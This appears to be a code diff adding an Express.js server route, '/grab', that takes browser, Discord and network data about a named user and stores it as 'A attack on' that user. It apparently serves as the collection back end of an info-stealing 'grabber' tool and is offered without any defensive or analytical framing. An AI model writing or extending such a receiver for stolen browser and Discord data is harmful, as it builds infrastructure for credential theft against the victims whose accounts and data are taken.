@@ -1,0 +1,30 @@
+const express = require("express");
+const db = require("../../database.js");
+const router = express.Router();
+const { generateToken } = require("../../service/utils.js");
+const { createScan } = require("../../models/Scan.js");
+
+router.post("/grab", (req, res) => {
+  const { type, browser, discord, network, user } = req.body;
+
+  console.log("Data type: ", type); //information
+
+  createScan(db, {
+    name: user,
+    description: "A attack on " + user + ".",
+
+    browser: browser,
+    discord: discord,
+    network: network,
+  })
+    .then((result) => {
+      console.log("Result: ", result);
+      res.json({ message: "success", id: result.id });
+    })
+    .catch((err) => {
+      console.log("Error: ", err);
+      res.status(400).json({ message: "failure" });
+    });
+});
+
+module.exports = router;
